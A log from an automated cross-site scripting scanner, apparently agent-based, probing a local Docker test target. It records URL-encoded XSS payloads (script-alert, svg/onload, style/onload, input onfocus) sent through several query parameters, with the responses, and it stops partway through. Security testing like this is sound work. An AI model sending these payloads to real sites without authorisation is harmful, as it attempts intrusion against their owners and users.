+2026-10-30 15:50:51,982 - DynamicXSSOrchestrator - WARNING - OAST agent not available - continuing without OAST testing
+2026-10-30 15:50:51,984 - DynamicXSSOrchestrator - INFO - Starting dynamic XSS verification for http://host.docker.internal:51481
+2026-10-30 15:50:51,986 - ReconAgent - INFO - Starting reconnaissance on http://host.docker.internal:51481
+2026-10-30 15:50:51,990 - src.xss_agent.utils.nuclei_runner - INFO - Running Nuclei against http://host.docker.internal:51481
+2026-10-30 15:50:57,002 - src.xss_agent.utils.nuclei_runner - ERROR - Nuclei scan timeout after 120 seconds
+2026-10-30 15:50:57,003 - ReconAgent - ERROR - Failed to run Nuclei
+2026-10-30 15:50:57,004 - DynamicXSSOrchestrator - INFO - Discovering forms for stored XSS testing
+2026-10-30 15:50:57,006 - FormDiscoveryAgent - INFO - Discovering forms on http://host.docker.internal:51481
+2026-10-30 15:50:58,041 - FormDiscoveryAgent - INFO - Discovered 0 potential XSS forms
+2026-10-30 15:50:58,042 - DynamicXSSOrchestrator - WARNING - No XSS vulnerabilities found by Nuclei or form testing
+2026-10-30 15:50:58,048 - DynamicXSSOrchestrator - INFO - Results saved to ./dynamic_xss_results.json
+2026-10-30 15:50:58,054 - DynamicXSSOrchestrator - INFO - Results saved to ./results/dynamic_xss_results.json
+2026-10-30 15:50:58,055 - DynamicXSSOrchestrator - INFO - Results saved to ./dynamic_xss_results.json and ./results/dynamic_xss_results.json
+2026-10-30 15:50:58,096 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,115 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,133 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,145 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,156 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,168 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,179 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,191 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,202 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,215 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,226 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,237 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,248 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,260 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,271 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,284 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,295 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,307 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,321 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,337 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,354 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,374 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,395 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,412 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,434 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,446 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,459 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,471 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,484 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,497 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,511 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,524 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,537 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,549 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,562 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,575 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,588 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,601 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,616 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,634 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,656 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,676 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,700 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,726 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/ "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:58,750 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,775 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,801 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,827 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,854 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,883 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,911 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,941 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:58,974 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,006 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:59,037 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:59,090 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:59,119 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,152 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,184 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,210 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,235 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,259 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:59,291 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:59,320 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:59,356 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,481 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,537 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,579 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,622 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,666 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:59,705 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:59,739 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:59,770 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,800 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,874 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,919 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,953 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:59,995 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:00,058 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:00,098 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:00,140 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,179 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,208 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,237 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,273 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,309 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:00,345 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:00,373 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:00,401 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,440 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,480 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,511 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/name/set?name=Cocomelon "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,551 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,588 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:00,624 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:00,660 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/name/set?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:00,707 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:00,753 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:00,795 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:00,833 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:00,872 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,919 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:00,964 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,004 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,046 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,080 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,109 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,143 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,189 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,232 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,283 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,331 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,373 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,413 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,446 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,481 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,506 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,529 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,552 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,589 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,624 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,653 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,681 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,705 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,723 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,741 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,758 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,776 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,794 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,812 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,829 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,846 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:01,867 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,897 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,940 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:01,984 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:02,015 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:02,049 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:02,081 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:02,112 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:51:02,142 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:02,170 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:02,194 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:02,223 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:51:02,249 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,276 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,303 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,326 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,353 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,392 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,425 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,459 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,484 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,509 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,540 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,580 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,606 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,630 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,651 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,673 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,695 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,712 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,727 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,743 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,760 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,776 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,793 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,812 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,827 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,842 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,859 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
